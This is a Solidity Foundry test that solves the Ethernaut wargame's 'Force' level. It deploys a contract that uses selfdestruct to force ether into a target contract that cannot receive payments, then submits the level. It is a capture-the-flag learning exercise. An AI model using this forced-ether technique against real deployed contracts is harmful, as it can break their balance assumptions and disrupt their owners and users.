pragma solidity ^0.8.10;

import 'ds-test/test.sol';
import 'forge-std/Vm.sol';

import '../levels/07-Force/ForceFactory.sol';
import '../core/Ethernaut.sol';

contract BruteForce {
  event Received(address caller, uint amount, string message);

  function pwn(address _forceAddr) external {
    selfdestruct(payable(_forceAddr));
  }

  fallback() external payable {
    emit Received(msg.sender, msg.value, "Fallback was called");
  }
}

contract ForceTest is DSTest {
  //--------------------------------------------------------------------------------
  //                            Setup Game Instance
  //--------------------------------------------------------------------------------

  Vm vm = Vm(address(HEVM_ADDRESS)); // `ds-test` library cheatcodes for testing
  Ethernaut ethernaut;
  address attacker = address(0xdeadbeef);

  function setUp() public {
    ethernaut = new Ethernaut(); // initiate Ethernaut contract instance
    vm.deal(attacker, 1 ether); // fund our attacker contract with 1 ether
  }

  function testForceHack() public {
    //--------------------------------------------------------------------------------
    //                             Setup Level Instance
    //--------------------------------------------------------------------------------
    ForceFactory forceFactory = new ForceFactory();
    ethernaut.registerLevel(forceFactory);
    vm.startPrank(attacker);

    address levelAddress = ethernaut.createLevelInstance(forceFactory);
    Force forceContract = Force(payable(levelAddress));

    //--------------------------------------------------------------------------------
    //                             Start Level Attack
    //--------------------------------------------------------------------------------
    
    // deploy 
    BruteForce bruteForce = new BruteForce();
    address(bruteForce).call{value: 1 ether}("");
    assertEq(address(bruteForce).balance, 1 ether);

    bruteForce.pwn(address(forceContract));

    //--------------------------------------------------------------------------------
    //                                Submit Level
    //--------------------------------------------------------------------------------
    bool challengeCompleted = ethernaut.submitLevelInstance(
      payable(levelAddress)
    );
    vm.stopPrank();
    assert(challengeCompleted);
  }
}